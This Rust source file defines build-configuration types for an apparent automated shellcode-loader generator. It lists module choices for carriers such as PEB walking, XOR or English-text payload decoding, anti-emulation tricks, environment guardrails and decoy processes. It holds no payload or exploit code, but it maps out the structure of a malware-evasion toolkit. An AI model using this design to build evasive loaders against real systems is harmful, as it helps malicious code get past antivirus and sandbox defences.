//! Build configuration types for the controller's dispatch layer.
//!
//! These types mirror the build crate's module and encoding model but are
//! serializable for Elasticsearch indexing and gRPC proto conversion.

use serde::{Deserialize, Serialize};
use std::path::PathBuf;

// ============================================================================
// Module Selection
// ============================================================================

/// Module selection for modular template assembly.
///
/// Each field names a module variant file under `build/templates/modules/`.
/// Use `"none"` for disabled optional slots. The seven slots are:
/// carrier, decoder, antiemulation, deconditioner, guardrail,
/// virtualprotect, and decoy.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct ModuleSelectionSpec {
    pub carrier: String,
    pub decoder: String,
    #[serde(default = "default_none")]
    pub antiemulation: String,
    #[serde(default = "default_none")]
    pub deconditioner: String,
    #[serde(default = "default_none")]
    pub guardrail: String,
    #[serde(default = "default_standard")]
    pub virtualprotect: String,
    #[serde(default = "default_none")]
    pub decoy: String,
}

fn default_none() -> String {
    "none".to_string()
}

fn default_standard() -> String {
    "standard".to_string()
}

impl ModuleSelectionSpec {
    /// Build from a proto `ModuleSelection`, falling back to defaults for empty fields.
    pub fn from_proto_or_default(proto: &crate::automutate::controller::ModuleSelection) -> Self {
        let d = Self::default();
        fn pick(proto_val: &str, default: String) -> String {
            if proto_val.is_empty() {
                default
            } else {
                proto_val.to_string()
            }
        }
        Self {
            carrier: pick(&proto.carrier, d.carrier),
            decoder: pick(&proto.decoder, d.decoder),
            antiemulation: pick(&proto.antiemulation, d.antiemulation),
            deconditioner: pick(&proto.deconditioner, d.deconditioner),
            guardrail: pick(&proto.guardrail, d.guardrail),
            virtualprotect: pick(&proto.virtualprotect, d.virtualprotect),
            decoy: pick(&proto.decoy, d.decoy),
        }
    }
}

impl Default for ModuleSelectionSpec {
    fn default() -> Self {
        // Must match actual module files in build/templates/modules/
        Self {
            carrier: "alloc_rw_rx".to_string(), // alloc_rw_rx, change_rw_rx, peb_walk
            decoder: "xor".to_string(),         // xor, english
            antiemulation: "none".to_string(),  // none, sirallocalot, timeraw
            deconditioner: "none".to_string(),  // none, alloc_loop
            guardrail: "none".to_string(),      // none, env
            virtualprotect: "standard".to_string(), // standard, undersized
            decoy: "none".to_string(),          // none, calc, winexec
        }
    }
}

impl From<ModuleSelectionSpec> for build::ModuleSelection {
    fn from(spec: ModuleSelectionSpec) -> Self {
        Self {
            carrier: spec.carrier,
            decoder: spec.decoder,
            antiemulation: spec.antiemulation,
            deconditioner: spec.deconditioner,
            guardrail: spec.guardrail,
            virtualprotect: spec.virtualprotect,
            decoy: spec.decoy,
        }
    }
}

// ============================================================================
// Build Spec
// ============================================================================

/// Modular build specification for the `@MODULE` marker system.
///
/// Combines a module selection, a raw payload file path, and the encoding
/// type used to generate `payload.h`. Passed from [`JobSession`](super::session::JobSession)
/// into the build crate for each round's artifact construction.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModularBuildSpec {
    /// Module selection for assembly
    pub modules: ModuleSelectionSpec,
    /// Path to raw payload file (.bin)
    pub payload_path: PathBuf,
    /// Payload encoding type: "xor" or "english"
    #[serde(default = "default_encoding")]
    pub encoding: String,
}

fn default_encoding() -> String {
    "xor".to_string()
}
